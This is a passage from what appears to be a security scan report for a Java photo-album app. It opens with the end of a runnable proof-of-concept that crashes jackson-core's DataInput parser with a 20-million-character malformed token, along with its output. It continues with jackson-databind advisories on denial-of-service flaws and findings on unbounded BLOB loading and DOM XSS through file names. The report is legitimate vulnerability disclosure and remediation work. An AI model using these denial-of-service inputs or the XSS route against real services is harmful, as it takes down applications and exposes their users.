                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();
            } catch (IOException e) {
                message = "(stream ended: " + e + ")";
            }
            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;
            long heapAfter = usedHeap();

            int msgLen = message == null ? -1 : message.length();
            System.out.println("Exception message length: " + msgLen + " characters");
            System.out.println("Elapsed time: " + elapsedMs + " ms");
            System.out.println("Approx additional heap used: " + ((heapAfter - heapBefore) / (1024 * 1024)) + " MB");
            System.out.println("Message length proportional to the full " + IDENTIFIER_CHAR_COUNT
                    + "-character payload (unbounded)? " + (msgLen > 1_000_000));
        }

        System.out.println("\n=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===");
        {
            InputStream raw = concat3("{\"a\": t".getBytes("UTF-8"),
                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), " }".getBytes("UTF-8"));
            JsonFactory factory = new JsonFactory();
            JsonParser p = factory.createParser(raw);

            long t0 = System.nanoTime();
            String message = null;
            try {
                p.nextToken(); p.nextToken(); p.nextToken();
            } catch (JsonParseException e) {
                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();
            } catch (IOException e) {
                message = "(stream ended: " + e + ")";
            }
            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;
            int msgLen = message == null ? -1 : message.length();
            System.out.println("Exception message length: " + msgLen + " characters");
            System.out.println("Elapsed time: " + elapsedMs + " ms");
            System.out.println("Message length bounded near default maxErrorTokenLength (256)? " + (msgLen < 500));
        }
    }

    static InputStream concat3(byte[] prefix, InputStream middle, byte[] suffix) {
        InputStream first = new java.io.SequenceInputStream(new java.io.ByteArrayInputStream(prefix), middle);
        return new java.io.SequenceInputStream(first, new java.io.ByteArrayInputStream(suffix));
    }

    static long usedHeap() {
        Runtime rt = Runtime.getRuntime();
        System.gc();
        return rt.totalMemory() - rt.freeMemory();
    }
}
```

## Captured Evidence (actual run output)

```
Malformed token: "t" followed by 20000000 Java-identifier characters ('x'), then a terminating
space, never completing "true"/"false"/"null"/NaN.

=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===
Exception message length: 20000109 characters
Elapsed time: 81 ms
Approx additional heap used (best-effort, GC-noisy): 38 MB
Message length is proportional to the full 20000000-character attacker payload (unbounded)? true

=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===
Exception message length: 367 characters
Elapsed time: 7 ms
Message length bounded near ErrorReportConfiguration.getMaxErrorTokenLength() (default 256)? true
```

The same 20-million-character malformed token, fed to the two parser variants, produces a
367-character message via the correctly-bounded `InputStream` path and a 20,000,109-character
message via the vulnerable `DataInput` path — a difference of roughly 54,500x for identical
input, confirming the missing bound is the sole cause of the difference.

## Impact

Any application creating parsers via `JsonFactory.createParser(DataInput)` over
attacker-supplied input (a fully public, documented API) is exposed to unbounded memory growth
from a single malformed token. Scaling the payload from the 20MB demonstrated here to
gigabytes (well within a typical unbounded request body) would drive the accumulated
`StringBuilder` — which additionally undergoes byte-to-char expansion and internal doubling —
to consume many times the raw payload size, realistically triggering `OutOfMemoryError` and
denying service to the whole JVM process. Critically, **no available configuration mitigates
this**: `maxDocumentLength` cannot be set for `DataInput` sources at all, and `maxStringLength`
does not apply to this code path.

## Remediation

1. Add the `maxErrorTokenLength` check to the append loop in
   `UTF8DataInputJsonParser._reportInvalidToken()`, appending `"..."` and breaking when the
   limit is reached — mirroring the three other parser implementations exactly.
2. Add a parameterized regression test across all four parser implementations asserting the
   exception message length is bounded by `maxErrorTokenLength` plus a small constant.
3. Consider extracting this bounded-scan logic into a single shared helper on
   `ParserMinimalBase` to prevent this class of per-implementation drift recurring.

Recommended fix:
- com.fasterxml.jackson.core:jackson-core: upgrade to 2.21.7 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-91776: jackson-databind retains every unknown raw type ID 
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-91776](https://github.com/advisories/GHSA-wv8q-qhhj-9h54): jackson-databind retains every unknown raw type ID 

Severity: HIGH

Affected resolved dependencies:
- com.fasterxml.jackson.core:jackson-databind:2.19.0 (transitive via org.springframework.boot:spring-boot-starter-json; compile scope; pom.xml:78); affected range: >= 2.19.0, <= 2.21.6

Advisory description / exploitation conditions:
### Summary

With `@JsonTypeInfo(use = Id.NAME, defaultImpl = ...)`, every distinct unknown
raw type ID selects the same fallback deserializer but is retained as a
separate key in `TypeDeserializerBase._deserializers`. An attacker who can
repeatedly supply new unknown type IDs can grow this process-lifetime cache
without a configured bound.

### Details

The affected path is `TypeDeserializerBase._findDeserializer()`. After an
unknown name-based type ID resolves to the configured fallback/default
implementation, jackson-databind caches the result under the attacker-provided
raw `typeId`. Although all such IDs select the same fallback deserializer, each
new string remains a distinct cache key.

The behavior is runtime-confirmed in jackson-databind 2.22.1 and 3.2.1.
Current 2.22 and 3.2 source branches retained the unbounded `_deserializers`
map and per-raw-ID cache write when rechecked. The earlier affected floor has
not been established, patched versions are: 2.18.11, 2.21.7, 2.22.3, 3.1.7 and 3.2.3.

The vulnerable application must enable name-based polymorphism with a
`defaultImpl` or equivalent fallback, accept attacker-influenced type IDs, and
reuse a long-lived mapper/type deserializer across requests.

Suggested correction: avoid caching each unknown raw ID when every such ID
resolves to the same fallback, use a fallback sentinel, or use an explicitly
bounded concurrency-safe cache. A regression should contrast many distinct
unknown IDs with repetitions of one unknown ID across requests.

### PoC

Configure a polymorphic base type with
`@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, defaultImpl = Fallback.class)` and
deserialize inputs containing unknown type names through the same mapper.
Inspect `TypeDeserializerBase._deserializers` after the run.

On affected 2.x and 3.x versions, 10,000 distinct unknown raw type IDs produce
10,000 retained cache entries even though every input selects the same
fallback deserializer. A matched control that repeats one unknown ID 10,000
times produces one retained entry. This isolates attacker-controlled key
cardinality from ordinary request count.

### Impact

Where the stated polymorphic fallback configuration is exposed to
attacker-influenced type IDs, distinct inputs cause incremental
process-lifetime memory retention and eventual availability pressure or
denial of service. This is not claimed as a single-request allocation spike,
and no fixed bytes-per-ID or time-to-out-of-memory value is asserted. No
confidentiality, integrity, or code-execution impact is claimed.

Requested credit: Daniel Birtwhistle

Recommended fix:
- com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.7 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

### CVE-2026-91777: jackson-databind quadratic forward-reference completion 
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-91777](https://github.com/advisories/GHSA-cxp5-3px4-pw24): jackson-databind quadratic forward-reference completion 

Severity: HIGH

Affected resolved dependencies:
- com.fasterxml.jackson.core:jackson-databind:2.19.0 (transitive via org.springframework.boot:spring-boot-starter-json; compile scope; pom.xml:78); affected range: >= 2.19.0, <= 2.21.6

Advisory description / exploitation conditions:
### Summary

When an `@JsonIdentityInfo` collection or map first creates N unresolved
object-ID references and later resolves the same IDs in reverse order,
jackson-databind scans the remaining pending-reference accumulator for each
resolution. A shallow JSON document whose size grows linearly can therefore
cause quadratic CPU work during deserialization.

### Details

The affected path is forward-reference completion in
`CollectionDeserializer.CollectionReferringAccumulator.resolveForwardReference()`
and the corresponding map implementation. The implementation performs a
linear search of the pending accumulator for every resolved object ID.

The behavior is runtime-confirmed in jackson-databind 2.5.0, 2.22.1, and
3.2.1. Current 2.22 and 3.2 source branches retained the same design when
rechecked. A 2.4.0 control fails closed before successful reverse-order
completion, so 2.5.0 is the conservative runtime-confirmed affected floor.
The patched versions are: 2.18.11, 2.21.7, 2.22.3, 3.1.7 and 3.2.3.

The vulnerable application must deserialize attacker-influenced JSON into an
identity-enabled collection or map. The issue does not require deep nesting or
syntactically unusual JSON.

Suggested correction: replace repeated linear lookup/removal with a keyed
pending-reference structure or another design that provides linear or
amortized-linear completion. A regression should preserve input order,
duplicate-ID behavior, and unresolved-ID errors while bounding reverse-order
resolution work.

### PoC

The proof constructs a shallow collection containing N unresolved
`@JsonIdentityInfo` references followed by definitions of those same IDs in
reverse order. Its ID class counts `equals()` calls, giving a deterministic
work measure rather than a timing-dependent result.

With N=2,000, affected versions perform exactly 2,003,000 ID comparisons. An
equally sized control in which every reference is already resolved performs
zero comparisons in the pending-reference lookup path. The run is bounded to
a 512 MiB JVM. The result demonstrates quadratic growth: approximately
`N * (N + 1) / 2` comparisons, plus fixed setup comparisons.

### Impact

An unauthenticated source that can submit JSON to an application using the
affected identity-enabled collection or map shape can consume quadratic CPU
and exhaust a request-time or worker-capacity budget, causing denial of
service. The application model/configuration prerequisite is material. No
confidentiality, integrity, code-execution, or parser-depth impact is claimed.

Requested credit: Daniel Birtwhistle

Recommended fix:
- com.fasterxml.jackson.core:jackson-databind: upgrade to 2.21.7 or a later supported patched release

Version-range match confirmed against resolved Maven dependencies. This dependency finding does not establish application-level exploit reachability; test-scoped matches are not runtime exposure.

## CWE Findings (Code-Level Vulnerabilities)

### CWE-789: Memory Allocation with Excessive Size Value
- **Category:** Code Quality
- **Severity:** potential
- **Story Points:** 5
- **Files:** src/main/java/com/photoalbum/controller/HomeController.java:38, src/main/java/com/photoalbum/service/impl/PhotoServiceImpl.java:54, src/main/java/com/photoalbum/repository/PhotoRepository.java:23, src/main/java/com/photoalbum/model/Photo.java:39, src/main/java/com/photoalbum/config/SecurityConfig.java:57, Dockerfile:28

Unbounded BLOB materialization on public gallery requests. HomeController.index (38-44) calls getAllPhotos; PhotoServiceImpl.getAllPhotos (54-56) calls PhotoRepository.findAllOrderByUploadedAtDesc (23-29), whose SELECT includes photo_data for every row with no row/aggregate-byte limit or pagination. Photo.photoData (39-41) is an eager byte[] LOB, so the result List materializes the entire accumulated gallery binary payload in heap although the page only needs metadata. SecurityConfig line 57 permits anonymous GET /. Once legitimate authenticated uploads accumulate a gallery comparable to the Docker JVM 512 MiB maximum (Dockerfile line 28), a single gallery read, or concurrent anonymous reads of a smaller gallery, can exhaust heap. The attacker need not upload or authenticate to trigger reads; large stored dataset/concurrency is a precondition. The 10 MiB per-file and 50 MiB upload-request limits and header-only image dimension check bound individual uploads, not aggregate query allocation. No runtime exhaustion test performed.

### CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- **Category:** Injection Attacks
- **Severity:** optional
- **Story Points:** 8
- **Files:** src/main/resources/static/js/upload.js:71, src/main/resources/static/js/upload.js:73, src/main/resources/static/js/upload.js:81, src/main/resources/static/js/upload.js:215

DOM XSS in handleFiles -> showErrors. Lines 71-75 concatenate externally supplied File.name into validation messages; lines 81-82 pass them to showErrors, whose lines 216-218 insert unescaped messages using innerHTML. A file with an HTML-event-handler filename and disallowed MIME type triggers HTML parsing when a victim selects or drops it, before any authenticated upload request. Filename text and markup are not encoded. Requires victim file-selection/drop interaction; not a claim of anonymous remote stored XSS. Escaped Thymeleaf th:text output and server upload authentication do not protect this client-side error path. Default Spring Security headers do not include a script-blocking CSP.
